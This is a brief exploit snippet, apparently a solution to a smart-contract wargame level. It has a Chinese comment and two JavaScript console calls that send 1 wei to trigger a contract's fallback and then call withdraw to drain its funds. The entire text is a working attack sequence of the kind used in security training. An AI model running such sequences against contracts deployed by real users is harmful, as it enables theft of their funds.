//只要满足msg.value > 0 及contributions[msg.sender] > 0即可,直接进行转款满足这个条件,然后再进行提款(withdraw)✅
await contract.sendTransaction({value: 1})
contract.withdraw()
